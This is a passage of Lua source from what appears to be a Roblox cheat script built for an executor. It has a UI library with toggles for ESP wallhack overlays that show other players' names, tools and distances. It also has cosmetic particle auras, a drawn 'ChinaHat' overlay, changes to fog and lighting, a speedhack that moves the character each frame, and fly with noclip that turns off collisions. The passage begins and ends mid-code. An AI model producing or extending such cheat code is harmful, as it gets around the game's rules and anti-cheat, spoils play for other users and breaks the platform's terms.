				cache.Text.Tool.Text = (tool and tool.Name) or "none";
				cache.Text.Tool.TextColor3 = ESPConfig.Text.Tool.Color;
			end
		end
		if cache.Text.Studs then
			cache.Text.Studs.Visible = ESPConfig.Text.Studs.Enable;
			if ESPConfig.Text.Studs.Enable then
				cache.Text.Studs.Position = U2.new(0, (position.X + (size.X / 2)) - (cache.Text.Studs.AbsoluteSize.X / 2), 0, (position.Y - S.GU:GetGuiInset().Y) + size.Y + 5);
				local meters = (S.WS.CurrentCamera.CFrame.Position - rootPart.Position).Magnitude * 0.28;
				cache.Text.Studs.Text = STR.fmt("[%.0fm]", meters);
				cache.Text.Studs.TextColor3 = ESPConfig.Text.Studs.Color;
			end
		end
	else
		if cache.Text.Name then
			cache.Text.Name.Visible = false;
		end
		if cache.Text.Tool then
			cache.Text.Tool.Visible = false;
		end
		if cache.Text.Studs then
			cache.Text.Studs.Visible = false;
		end
	end
end;
for _, player in ipairs(S.PS:GetPlayers()) do
	if (player ~= LP) then
		render_esp(player);
	end
end
S.PS.PlayerAdded:Connect(function(player)
	if (player ~= LP) then
		render_esp(player);
	end
end);
S.PS.PlayerRemoving:Connect(function(player)
	if (player ~= LP) then
		clear_esp(player);
	end
end);
if ESPConnections.Heartbeat then
	ESPConnections.Heartbeat:Disconnect();
end
ESPConnections.Heartbeat = HRT:Connect(function()
	for v, _ in pairs(ESPCache) do
		if v then
			update_esp(v);
		end
	end
end);
local NameESPGroup = Tabs.Visuals:AddRightGroupbox(">_<");
local ShowNameMethodConfig = {Mode="Display"};
NameESPGroup:AddDropdown("ShowNameMethod", {Values={"Display","Default","None"},Default="Display",Multi=false,Text="ShowNameMethod",Callback=function(v)
	ShowNameMethodConfig.Mode = v;
end});
local function UpdateShowNameMethod(player)
	if (player == LP) then
		return;
	end
	local char = player.Character;
	if not char then
		return;
	end
	local hum = char:FindFirstChildOfClass("Humanoid");
	if not hum then
		return;
	end
	if (ShowNameMethodConfig.Mode == "None") then
		hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None;
		return;
	end
	hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer;
	hum.NameOcclusion = Enum.NameOcclusion.NoOcclusion;
	hum.DisplayName = ((ShowNameMethodConfig.Mode == "Display") and (player.DisplayName ~= "") and player.DisplayName) or player.Name;
end
local function UpdateAllShowNameMethod()
	for _, p in ipairs(S.PS:GetPlayers()) do
		UpdateShowNameMethod(p);
	end
end
S.PS.PlayerAdded:Connect(function(p)
	p.CharacterAdded:Connect(function()
		UpdateShowNameMethod(p);
	end);
end);
for _, p in ipairs(S.PS:GetPlayers()) do
	if p.Character then
		UpdateShowNameMethod(p);
	end
	p.CharacterAdded:Connect(function()
		UpdateShowNameMethod(p);
	end);
end
HRT:Connect(UpdateAllShowNameMethod);
G.originalPlayerMaxZoom = LP.CameraMaxZoomDistance;
G.originalPlayerMinZoom = LP.CameraMinZoomDistance;
getgenv().SphereAuraSettings = {enabled=false,color1=Color3.new(1, 1, 1),color2=Color3.new(1, 1, 1),size=10,lightEmission=1};
local SphereAuraSettings = getgenv().SphereAuraSettings;
getgenv().currentAura = nil;
local currentAura = getgenv().currentAura;
getgenv().updateAura = function(prop)
	if not (currentAura and currentAura.Parent) then
		return;
	end
	local swirl = currentAura:FindFirstChild("Attachment"):FindFirstChild("swirl");
	if not swirl then
		return;
	end
	if ((prop == "color") or (prop == nil)) then
		swirl.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, SphereAuraSettings.color1),ColorSequenceKeypoint.new(1, SphereAuraSettings.color2)});
	end
	if ((prop == "size") or (prop == nil)) then
		swirl.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, SphereAuraSettings.size),NumberSequenceKeypoint.new(1, SphereAuraSettings.size)});
	end
	if ((prop == "light") or (prop == nil)) then
		swirl.LightEmission = SphereAuraSettings.lightEmission;
	end
end;
local updateAura = getgenv().updateAura;
getgenv().removePlayerAura = function()
	if (currentAura and currentAura.Parent) then
		currentAura:Destroy();
	end
	getgenv().currentAura = nil;
	currentAura = nil;
end;
local removePlayerAura = getgenv().removePlayerAura;
getgenv().createPlayerAura = function(character)
	removePlayerAura();
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 3);
	if not humanoidRootPart then
		return;
	end
	local auraBase = Instance.new("Part");
	auraBase.Size, auraBase.Transparency, auraBase.Anchored, auraBase.CanCollide, auraBase.Name, auraBase.Parent = Vector3.new(1, 1, 1), 1, false, false, "AuraBase", S.WS;
	local weld = Instance.new("Weld");
	weld.Part0, weld.Part1, weld.C0, weld.Parent = humanoidRootPart, auraBase, CFrame.new(0, 0, 0), auraBase;
	local attachment = Instance.new("Attachment");
	attachment.Parent = auraBase;
	local swirlEmitter = Instance.new("ParticleEmitter");
	swirlEmitter.Name, swirlEmitter.Texture, swirlEmitter.Lifetime, swirlEmitter.Rate, swirlEmitter.RotSpeed, swirlEmitter.Speed = "swirl", "rbxassetid://10558425570", NumberRange.new(2), 150, NumberRange.new(200), NumberRange.new(0.01);
	swirlEmitter.SpreadAngle, swirlEmitter.VelocitySpread, swirlEmitter.Size, swirlEmitter.Transparency = Vector2.new(-360, 360), -360, NumberSequence.new({NumberSequenceKeypoint.new(0, SphereAuraSettings.size),NumberSequenceKeypoint.new(1, SphereAuraSettings.size)}), NumberSequence.new({NumberSequenceKeypoint.new(0, 1),NumberSequenceKeypoint.new(0.5006, 0.5),NumberSequenceKeypoint.new(1, 1)});
	swirlEmitter.Color, swirlEmitter.LightEmission, swirlEmitter.ZOffset, swirlEmitter.Orientation, swirlEmitter.LockedToPart, swirlEmitter.Parent = ColorSequence.new({ColorSequenceKeypoint.new(0, SphereAuraSettings.color1),ColorSequenceKeypoint.new(1, SphereAuraSettings.color2)}), SphereAuraSettings.lightEmission, -1, Enum.ParticleOrientation.VelocityPerpendicular, true, attachment;
	getgenv().currentAura = auraBase;
	currentAura = auraBase;
end;
local createPlayerAura = getgenv().createPlayerAura;
getgenv().applyPlayerAura = function()
	local character = LP.Character;
	if not character then
		getgenv().characterAddedConnection = nil;
		local characterAddedConnection = getgenv().characterAddedConnection;
		if characterAddedConnection then
			characterAddedConnection:Disconnect();
		end
		getgenv().characterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if SphereAuraSettings.enabled then
				createPlayerAura(newCharacter);
			end
		end);
		return;
	end
	createPlayerAura(character);
	if not getgenv().characterAddedConnection then
		getgenv().characterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if SphereAuraSettings.enabled then
				createPlayerAura(newCharacter);
			end
		end);
	end
end;
local applyPlayerAura = getgenv().applyPlayerAura;
getgenv().GetSphereAuraSettings = function()
	return SphereAuraSettings;
end;
local SphereAuraGroup = Tabs.Visuals:AddRightGroupbox(">_<");
addToggleWithNotify(SphereAuraGroup, "SphereAura", {Text="SphereAura",Default=false,Callback=function(v)
	SphereAuraSettings.enabled = v;
	if v then
		applyPlayerAura();
	else
		removePlayerAura();
	end
end}):AddColorPicker("SphereAuraColor1", {Default=SphereAuraSettings.color1,Title="Color 1",Callback=function(val)
	SphereAuraSettings.color1 = val;
	updateAura("color");
end}):AddColorPicker("SphereAuraColor2", {Default=SphereAuraSettings.color2,Title="Color 2",Callback=function(val)
	SphereAuraSettings.color2 = val;
	updateAura("color");
end});
local SphereAuraSub = SphereAuraGroup:AddDependencyBox();
SphereAuraSub:AddSlider("SphereAuraSize", {Text="Size",Default=SphereAuraSettings.size,Min=1,Max=50,Rounding=1,Callback=function(val)
	SphereAuraSettings.size = val;
	updateAura("size");
end});
SphereAuraSub:AddSlider("SphereAuraLightEmission", {Text="LightEmission",Default=SphereAuraSettings.lightEmission,Min=0,Max=2,Rounding=2,Callback=function(val)
	SphereAuraSettings.lightEmission = val;
	updateAura("light");
end});
SphereAuraSub:SetupDependencies({{Toggles.SphereAura,true}});
local CircleAuraSettings = {enabled=false,beamColor=Color3.new(1, 1, 1),circleColor=Color3.new(1, 1, 1),lightEmission=0.8,circleTexture="rbxassetid://8920246243"};
local currentCircleAura;
local function removeCircleAura()
	if (currentCircleAura and currentCircleAura.Parent) then
		currentCircleAura:Destroy();
	end
	currentCircleAura = nil;
end
local function updateCircleAura(prop)
	if not (currentCircleAura and currentCircleAura.Parent) then
		return;
	end
	for _, obj in pairs(currentCircleAura:GetDescendants()) do
		if (((prop == nil) or (prop == "beamColor")) and obj:IsA("Beam")) then
			obj.Color = ColorSequence.new(CircleAuraSettings.beamColor);
		end
		if (((prop == nil) or (prop == "circleColor")) and obj:IsA("ParticleEmitter") and (obj.Name == "Circle")) then
			obj.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, CircleAuraSettings.circleColor),ColorSequenceKeypoint.new(1, CircleAuraSettings.circleColor)});
		end
		if (((prop == nil) or (prop == "lightEmission")) and (obj:IsA("Beam") or obj:IsA("ParticleEmitter"))) then
			obj.LightEmission = CircleAuraSettings.lightEmission;
		end
		if (((prop == nil) or (prop == "circleTexture")) and obj:IsA("ParticleEmitter") and (obj.Name == "Circle")) then
			obj.Texture = CircleAuraSettings.circleTexture;
		end
	end
end
local function createCircleAura(character)
	removeCircleAura();
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 3);
	if not humanoidRootPart then
		return;
	end
	local auraBase = Instance.new("Part");
	auraBase.Size, auraBase.Transparency, auraBase.Anchored, auraBase.CanCollide, auraBase.Name, auraBase.Parent = Vector3.new(1, 1, 1), 1, true, false, "CircleAuraBase", S.WS;
	auraBase.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.new(0, -0.15, 0);
	local positionUpdateConnection;
	positionUpdateConnection = HRT:Connect(function()
		if (humanoidRootPart and humanoidRootPart.Parent and auraBase and auraBase.Parent) then
			auraBase.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.new(0, -0.15, 0);
		elseif positionUpdateConnection then
			positionUpdateConnection:Disconnect();
		end
	end);
	auraBase.AncestryChanged:Connect(function()
		if (not auraBase.Parent and positionUpdateConnection) then
			positionUpdateConnection:Disconnect();
		end
	end);
	local mainAttachment = Instance.new("Attachment");
	mainAttachment.Name, mainAttachment.Position, mainAttachment.Parent = "Main", Vector3.new(0, -2.75, 0), auraBase;
	local circleEmitter = Instance.new("ParticleEmitter");
	circleEmitter.Name, circleEmitter.Texture, circleEmitter.Lifetime, circleEmitter.Rate, circleEmitter.RotSpeed, circleEmitter.Speed = "Circle", CircleAuraSettings.circleTexture, NumberRange.new(9), 0.333, NumberRange.new(120), NumberRange.new(0.001);
	circleEmitter.Size, circleEmitter.Transparency, circleEmitter.Color, circleEmitter.LightEmission, circleEmitter.ZOffset, circleEmitter.Orientation, circleEmitter.LockedToPart, circleEmitter.Parent = NumberSequence.new({NumberSequenceKeypoint.new(0, 3),NumberSequenceKeypoint.new(1, 3)}), NumberSequence.new({NumberSequenceKeypoint.new(0, 1),NumberSequenceKeypoint.new(0.1, 0),NumberSequenceKeypoint.new(0.5, 0),NumberSequenceKeypoint.new(0.6256, 0.0875),NumberSequenceKeypoint.new(0.7691, 0.3875),NumberSequenceKeypoint.new(0.8677, 0.7125),NumberSequenceKeypoint.new(0.923, 0.875),NumberSequenceKeypoint.new(0.9552, 0.9375),NumberSequenceKeypoint.new(1, 0.975)}), ColorSequence.new({ColorSequenceKeypoint.new(0, CircleAuraSettings.circleColor),ColorSequenceKeypoint.new(1, CircleAuraSettings.circleColor)}), CircleAuraSettings.lightEmission, 0.05, Enum.ParticleOrientation.VelocityPerpendicular, true, mainAttachment;
	local attachOne, attachTwo = Instance.new("Attachment"), Instance.new("Attachment");
	attachOne.Name, attachOne.Position, attachOne.Parent = "One", Vector3.new(0, -2.8, 2.6), auraBase;
	attachTwo.Name, attachTwo.Position, attachTwo.Parent = "Two", Vector3.new(0, -2.8, -2.6), auraBase;
	local beamOne = Instance.new("Beam");
	beamOne.Name, beamOne.Texture, beamOne.TextureSpeed, beamOne.TextureLength, beamOne.Width0, beamOne.Width1, beamOne.CurveSize0, beamOne.CurveSize1, beamOne.Segments, beamOne.LightEmission, beamOne.Transparency, beamOne.Color, beamOne.Attachment0, beamOne.Attachment1, beamOne.Parent = "One", "rbxassetid://8920073892", -0.3, 0.5, 4, 4, -3.5, 3.5, 25, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3),NumberSequenceKeypoint.new(1, 0.3)}), ColorSequence.new(CircleAuraSettings.beamColor), attachOne, attachTwo, auraBase;
	local beamTwo = Instance.new("Beam");
	beamTwo.Name, beamTwo.Texture, beamTwo.TextureSpeed, beamTwo.TextureLength, beamTwo.Width0, beamTwo.Width1, beamTwo.CurveSize0, beamTwo.CurveSize1, beamTwo.Segments, beamTwo.LightEmission, beamTwo.Transparency, beamTwo.Color, beamTwo.Attachment0, beamTwo.Attachment1, beamTwo.Parent = "Two", "rbxassetid://8920073892", 0.3, 0.5, 4, 4, 3.5, -3.5, 25, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3),NumberSequenceKeypoint.new(1, 0.3)}), ColorSequence.new(CircleAuraSettings.beamColor), attachOne, attachTwo, auraBase;
	local attachThree, attachFour = Instance.new("Attachment"), Instance.new("Attachment");
	attachThree.Name, attachThree.Position, attachThree.Parent = "Three", Vector3.new(0, -2.7, 0), auraBase;
	attachFour.Name, attachFour.Position, attachFour.Parent = "Four", Vector3.new(0, 6, 0), auraBase;
	local beamThree = Instance.new("Beam");
	beamThree.Name, beamThree.Texture, beamThree.TextureSpeed, beamThree.TextureLength, beamThree.Width0, beamThree.Width1, beamThree.Segments, beamThree.LightEmission, beamThree.Transparency, beamThree.Color, beamThree.FaceCamera, beamThree.Attachment0, beamThree.Attachment1, beamThree.Parent = "Three", "rbxassetid://9020147050", 0.3, 0.1, 5, 6, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 1),NumberSequenceKeypoint.new(0.1, 1),NumberSequenceKeypoint.new(0.4, 0.4),NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase;
	local beamFour = Instance.new("Beam");
	beamFour.Name, beamFour.Texture, beamFour.TextureSpeed, beamFour.TextureLength, beamFour.Width0, beamFour.Width1, beamFour.Segments, beamFour.LightEmission, beamFour.Transparency, beamFour.Color, beamFour.FaceCamera, beamFour.Attachment0, beamFour.Attachment1, beamFour.Parent = "Four", "rbxassetid://8984452855", 0.06, 0.4, 5, 6, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3),NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase;
	local beamFive = Instance.new("Beam");
	beamFive.Name, beamFive.Texture, beamFive.TextureSpeed, beamFive.TextureLength, beamFive.Width0, beamFive.Width1, beamFive.Segments, beamFive.LightEmission, beamFive.Transparency, beamFive.Color, beamFive.FaceCamera, beamFive.Attachment0, beamFive.Attachment1, beamFive.Parent = "Five", "http://www.roblox.com/asset/?id=4390493166", 0.2, 0.15, 4, 4, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3),NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase;
	currentCircleAura = auraBase;
end
local function applyCircleAura()
	local character = LP.Character;
	if not character then
		local circleAuraConnection;
		if circleAuraConnection then
			circleAuraConnection:Disconnect();
		end
		circleAuraConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if CircleAuraSettings.enabled then
				createCircleAura(newCharacter);
			end
		end);
		return;
	end
	createCircleAura(character);
	if not circleAuraConnection then
		local circleAuraConnection;
		circleAuraConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if CircleAuraSettings.enabled then
				createCircleAura(newCharacter);
			end
		end);
	end
end
getgenv().GetCircleAuraSettings = function()
	return CircleAuraSettings;
end;
addToggleWithNotify(SphereAuraGroup, "CircleAura", {Text="Aura",Default=false,Callback=function(v)
	CircleAuraSettings.enabled = v;
	if v then
		applyCircleAura();
	else
		removeCircleAura();
	end
end}):AddColorPicker("CircleAuraBeamColor", {Default=CircleAuraSettings.beamColor,Title="Color",Transparency=0,Callback=function(val)
	CircleAuraSettings.beamColor = val;
	updateCircleAura("beamColor");
end});
local CircleAuraSub = SphereAuraGroup:AddDependencyBox();
CircleAuraSub:AddSlider("CircleAuraLightEmission", {Text="Emission",Default=CircleAuraSettings.lightEmission,Min=0,Max=2,Rounding=2,Callback=function(val)
	CircleAuraSettings.lightEmission = val;
	updateCircleAura("lightEmission");
end});
CircleAuraSub:AddDropdown("CircleAuraCircleTexture", {Text="CircleTexture",Values={"8920246243","10365549270","5726444189","1266170131","12363692255","12363692920"},Default="8920246243",Callback=function(val)
	CircleAuraSettings.circleTexture = "rbxassetid://" .. val;
	updateCircleAura("circleTexture");
end});
CircleAuraSub:SetupDependencies({{Toggles.CircleAura,true}});
local ChinaHatSettings = {enabled=false,minCameraDistance=1,hatTransparency=0.35,circleTransparency=1,height=0.75,radius=5,sides=25,rainbow=false,color=Color3.fromRGB(255, 255, 255),offset=Vector3.new(0, 0.75, 0)};
local ChinaHatGroup = Tabs.Visuals:AddLeftGroupbox(">_<");
addToggleWithNotify(ChinaHatGroup, "ChinaHatEnabled", {Text="ChinaHat",Default=ChinaHatSettings.enabled,Callback=function(v)
	ChinaHatSettings.enabled = v;
end});
ChinaHatGroup:AddSlider("ChinaHatHeight", {Text="Height",Default=ChinaHatSettings.height,Min=0.1,Max=3,Rounding=2,Callback=function(val)
	ChinaHatSettings.height = val;
end});
ChinaHatGroup:AddSlider("ChinaHatRadius", {Text="Radius",Default=ChinaHatSettings.radius,Min=1,Max=10,Rounding=2,Callback=function(val)
	ChinaHatSettings.radius = val;
end});
ChinaHatGroup:AddToggle("ChinaHatRainbow", {Text="Rainbow",Default=ChinaHatSettings.rainbow,Callback=function(v)
	ChinaHatSettings.rainbow = v;
end}):AddColorPicker("ChinaHatColor", {Default=ChinaHatSettings.color,Title="Color",Transparency=0,Callback=function(val)
	ChinaHatSettings.color = val;
end});
local ChinaHatDrawings = {};
local tau = M.rad(360);
for i = 1, ChinaHatSettings.sides do
	ChinaHatDrawings[i] = {Drawing.new("Line"),Drawing.new("Triangle")};
	ChinaHatDrawings[i][1].ZIndex = 2;
	ChinaHatDrawings[i][1].Thickness = 2;
	ChinaHatDrawings[i][2].ZIndex = 1;
	ChinaHatDrawings[i][2].Filled = true;
end
RND:Connect(function()
	local pass = ChinaHatSettings.enabled and LP.Character and LP.Character:FindFirstChild("Head") and ((Cam.CFrame.p - Cam.Focus.p).magnitude > ChinaHatSettings.minCameraDistance) and LP.Character:FindFirstChildOfClass("Humanoid") and (LP.Character:FindFirstChildOfClass("Humanoid").Health > 0);
	for i = 1, #ChinaHatDrawings do
		local line, triangle = ChinaHatDrawings[i][1], ChinaHatDrawings[i][2];
		if pass then
			local color = (ChinaHatSettings.rainbow and Color3.fromHSV((((tick() % 5) / 5) - (i / #ChinaHatDrawings)) % 1, 0.5, 1)) or ChinaHatSettings.color;
			local pos = LP.Character.Head.Position + ChinaHatSettings.offset;
			local topWorld = pos + Vector3.new(0, ChinaHatSettings.height, 0);
			local last, next = (i / ChinaHatSettings.sides) * tau, ((i + 1) / ChinaHatSettings.sides) * tau;
			local lastWorld = pos + (Vector3.new(M.cos(last), 0, M.sin(last)) * ChinaHatSettings.radius);
			local nextWorld = pos + (Vector3.new(M.cos(next), 0, M.sin(next)) * ChinaHatSettings.radius);
			local lastScreen = Cam:WorldToViewportPoint(lastWorld);
			local nextScreen = Cam:WorldToViewportPoint(nextWorld);
			local topScreen = Cam:WorldToViewportPoint(topWorld);
			line.From = Vector2.new(lastScreen.X, lastScreen.Y);
			line.To = Vector2.new(nextScreen.X, nextScreen.Y);
			line.Color = color;
			line.Transparency = ChinaHatSettings.circleTransparency;
			line.Visible = true;
			triangle.PointA = Vector2.new(topScreen.X, topScreen.Y);
			triangle.PointB = line.From;
			triangle.PointC = line.To;
			triangle.Color = color;
			triangle.Transparency = ChinaHatSettings.hatTransparency;
			triangle.Visible = true;
		else
			line.Visible = false;
			triangle.Visible = false;
		end
	end
end);
local WorldGroup = Tabs.Visuals:AddLeftGroupbox(">_<");
local Lighting = S.LS;
local function ensureCC()
	local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect");
	if not cc then
		cc = Instance.new("ColorCorrectionEffect");
		cc.Parent = Lighting;
		cc.Enabled = true;
	end
	return cc;
end
local cc = ensureCC();
local WorldConfig = {FogEnabled=false,FogColor=Color3.new(1, 1, 1),FogStart=(Lighting.FogStart or 0),FogEnd=(Lighting.FogEnd or 100),Shadows=false,ShadowColor=(Lighting.ShadowColor or Color3.new(0, 0, 0)),Time=(Lighting.ClockTime or 12),Saturation=(cc.Saturation or 0),Brightness=(cc.Brightness or 0)};
local function applyWorld()
	if WorldConfig.FogEnabled then
		Lighting.FogStart = WorldConfig.FogStart;
		Lighting.FogEnd = WorldConfig.FogEnd;
		Lighting.FogColor = WorldConfig.FogColor;
	else
		Lighting.FogStart = 1000000;
		Lighting.FogEnd = 1000000;
	end
	Lighting.GlobalShadows = WorldConfig.Shadows;
	Lighting.ShadowColor = WorldConfig.ShadowColor;
	Lighting.ClockTime = WorldConfig.Time;
	local cc = ensureCC();
	cc.Saturation = WorldConfig.Saturation;
	cc.Brightness = WorldConfig.Brightness;
end
getgenv().worldUpdateConnection = nil;
local function startWorldUpdates()
	if getgenv().worldUpdateConnection then
		getgenv().worldUpdateConnection:Disconnect();
	end
	getgenv().worldUpdateConnection = HRT:Connect(function()
		if WorldConfig.FogEnabled then
			Lighting.FogStart = WorldConfig.FogStart;
			Lighting.FogEnd = WorldConfig.FogEnd;
			Lighting.FogColor = WorldConfig.FogColor;
		end
		Lighting.GlobalShadows = WorldConfig.Shadows;
		Lighting.ShadowColor = WorldConfig.ShadowColor;
		Lighting.ClockTime = WorldConfig.Time;
		local cc = ensureCC();
		cc.Saturation = WorldConfig.Saturation;
		cc.Brightness = WorldConfig.Brightness;
	end);
end
startWorldUpdates();
local FogToggle = addToggleWithNotify(WorldGroup, "FogEnabled", {Text="Fog",Default=false,Callback=function(v)
	WorldConfig.FogEnabled = v;
	applyWorld();
	if getgenv().worldUpdateConnection then
		getgenv().worldUpdateConnection:Disconnect();
		getgenv().worldUpdateConnection = nil;
	end
	startWorldUpdates();
end});
FogToggle:AddColorPicker("FogColor", {Default=Color3.new(1, 1, 1),Title="Col",Callback=function(val)
	WorldConfig.FogColor = val;
	applyWorld();
end});
WorldGroup:AddSlider("FogStart", {Text="FStart",Default=WorldConfig.FogStart,Min=0,Max=10000,Rounding=1,Callback=function(val)
	WorldConfig.FogStart = val;
	applyWorld();
end});
WorldGroup:AddSlider("FogEnd", {Text="FEnd",Default=WorldConfig.FogEnd,Min=0,Max=10000,Rounding=1,Callback=function(val)
	WorldConfig.FogEnd = val;
	applyWorld();
end});
local ShadowsToggle = WorldGroup:AddToggle("Shadows", {Text="Shadows",Default=false,Callback=function(v)
	WorldConfig.Shadows = v;
	applyWorld();
	if getgenv().worldUpdateConnection then
		getgenv().worldUpdateConnection:Disconnect();
		getgenv().worldUpdateConnection = nil;
	end
	startWorldUpdates();
end});
WorldGroup:AddSlider("Time", {Text="Time",Default=WorldConfig.Time,Min=0,Max=24,Rounding=1,Callback=function(val)
	WorldConfig.Time = val;
	applyWorld();
	if getgenv().worldUpdateConnection then
		getgenv().worldUpdateConnection:Disconnect();
		getgenv().worldUpdateConnection = nil;
	end
	startWorldUpdates();
end});
WorldGroup:AddSlider("Saturation", {Text="Sat",Default=WorldConfig.Saturation,Min=-1,Max=1,Rounding=1,Callback=function(val)
	WorldConfig.Saturation = val;
	applyWorld();
end});
WorldGroup:AddSlider("Brightness", {Text="Brt",Default=WorldConfig.Brightness,Min=-1,Max=1,Rounding=1,Callback=function(val)
	WorldConfig.Brightness = val;
	applyWorld();
end});
local LightingTypeGroup = Tabs.Visuals:AddRightGroupbox(">_<");
local LightingTypeList = {"Voxel","ShadowMap","Future"};
local LightingTypeEnum = {Voxel=Enum.Technology.Voxel,ShadowMap=Enum.Technology.ShadowMap,Future=Enum.Technology.Future};
LightingTypeGroup:AddDropdown("LightingType", {Text="LightingType",Values=LightingTypeList,Default="Voxel",Callback=function(val)
	local tech = LightingTypeEnum[val];
	if tech then
		S.LS.Technology = tech;
	end
end});
S.LS.Technology = LightingTypeEnum[LightingTypeList[1]];
local SpeedhackGroup = Tabs.Player:AddRightGroupbox(">_<");
local SpeedhackConfig = {Enabled=false,Active=false,Speed=50};
local speedHackConnection;
local function updateSpeedHack(character)
	if not character then
		return;
	end
	local rootPart = character:WaitForChild("HumanoidRootPart");
	local humanoid = character:WaitForChild("Humanoid");
	if speedHackConnection then
		speedHackConnection:Disconnect();
	end
	speedHackConnection = HRT:Connect(function(dt)
		if (SpeedhackConfig.Enabled and SpeedhackConfig.Active) then
			local move = humanoid.MoveDirection;
			if (move.Magnitude > 0) then
				rootPart.CFrame = rootPart.CFrame + (move.Unit * SpeedhackConfig.Speed * dt);
			end
		end
	end);
end
addToggleWithNotify(SpeedhackGroup, "SpeedhackEnabled", {Text="Speedhack",Default=false,Callback=function(v)
	SpeedhackConfig.Enabled = v;
	if v then
		updateSpeedHack(LP.Character);
	else
		SpeedhackConfig.Active = false;
		if speedHackConnection then
			speedHackConnection:Disconnect();
			speedHackConnection = nil;
		end
	end
end}):AddKeyPicker("SpeedhackKey", {Default="None",Text="Speedhack",NoUI=false,Callback=function()
	if not SpeedhackConfig.Enabled then
		return;
	end
	SpeedhackConfig.Active = not SpeedhackConfig.Active;
end});
local speedInput = SpeedhackGroup:AddInput("SpeedhackSpeedBox", {Text="Speed",Default=tostring(SpeedhackConfig.Speed),Numeric=true,Finished=true,Callback=function(val)
	local num = tonumber(val);
	if num then
		num = M.clamp(num, 1, 2000000);
		SpeedhackConfig.Speed = num;
	end
end});
LP.CharacterAdded:Connect(function(char)
	if SpeedhackConfig.Enabled then
		updateSpeedHack(char);
	end
end);
local FlyGroup = Tabs.Player:AddLeftGroupbox(">_<");
local FlyConfig = {Enabled=false,Active=false,Speed=1,Keybind=Enum.KeyCode.F};
local FlyLoop = nil;
local function setNoClip(character, state)
	if not character then
		return;
	end
	for _, part in ipairs(character:GetDescendants()) do
		if part:IsA("BasePart") then
			if state then
				if not part:GetAttribute("OriginalCollision") then
					part:SetAttribute("OriginalCollision", part.CanCollide);
					part:SetAttribute("OriginalTouch", part.CanTouch);
					if (part:GetAttribute("CanQuery") ~= nil) then
						part:SetAttribute("OriginalQuery", part.CanQuery);
					end
				end
				part.CanCollide = false;
				part.CanTouch = false;
				part.CanQuery = false;
			elseif (part:GetAttribute("OriginalCollision") ~= nil) then
				part.CanCollide = part:GetAttribute("OriginalCollision");
				part.CanTouch = part:GetAttribute("OriginalTouch");
				if (part:GetAttribute("OriginalQuery") ~= nil) then
					part.CanQuery = part:GetAttribute("OriginalQuery");
				end
				part:SetAttribute("OriginalCollision", nil);
				part:SetAttribute("OriginalTouch", nil);
				part:SetAttribute("OriginalQuery", nil);
			end
		end
	end
end
local function updateFly(character)
	if FlyLoop then
		FlyLoop:Disconnect();
		FlyLoop = nil;
	end
	if not character then
		return;
	end
	if not (FlyConfig.Enabled and FlyConfig.Active) then
		return;
	end
	setNoClip(character, true);
	FlyLoop = SND:Connect(function()
		local char = LP.Character;
		if not char then
			return;
		end
		setNoClip(char, true);
		local hrp = char:FindFirstChild("HumanoidRootPart");
		local hum = char:FindFirstChild("Humanoid");
		if (not hrp or not hum) then
			return;
		end
		local speed = FlyConfig.Speed * 50;
		local velocity = Vector3.new(0, 0, 0);
		if S.UIS:IsKeyDown(Enum.KeyCode.Space) then
			velocity = velocity + Vector3.new(0, speed, 0);
		end
		if S.UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
			velocity = velocity + Vector3.new(0, -speed, 0);
		end
		if S.UIS:IsKeyDown(Enum.KeyCode.W) then
			velocity = velocity + (Cam.CFrame.LookVector * speed);
		end
		if S.UIS:IsKeyDown(Enum.KeyCode.A) then
			velocity = velocity + (Cam.CFrame.RightVector * -speed);
		end
		if S.UIS:IsKeyDown(Enum.KeyCode.S) then
			velocity = velocity + (Cam.CFrame.LookVector * -speed);
		end
		if S.UIS:IsKeyDown(Enum.KeyCode.D) then
			velocity = velocity + (Cam.CFrame.RightVector * speed);
		end
		hrp.Velocity = velocity;
		hum:ChangeState("Freefall");
	end);
end
local function stopFly()
	if FlyLoop then
		FlyLoop:Disconnect();
		FlyLoop = nil;
	end
	local char = LP.Character;
	setNoClip(char, false);
	if char then
		local hrp = char:FindFirstChild("HumanoidRootPart");
		local hum = char:FindFirstChild("Humanoid");
		if hrp then
			hrp.Velocity = Vector3.new(0, -2, 0);
			local tempConn;
			tempConn = SND:Connect(function()
				if (not hrp or not hrp.Parent) then
					tempConn:Disconnect();
					return;
				end
				hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0);
				tempConn:Disconnect();
			end);
		end
		if hum then
			hum:ChangeState("Landing");
		end
	end
end
local function setFlyActive(state)
	FlyConfig.Active = state;
	if (FlyConfig.Enabled and FlyConfig.Active) then
		updateFly(LP.Character);
	else
		stopFly();
	end
end
addToggleWithNotify(FlyGroup, "FlyEnabled", {Text="Fly",Default=false,Callback=function(v)
	FlyConfig.Enabled = v;
	if not v then
		setFlyActive(false);
	end
	if (v and FlyConfig.Active) then
		updateFly(LP.Character);
	end
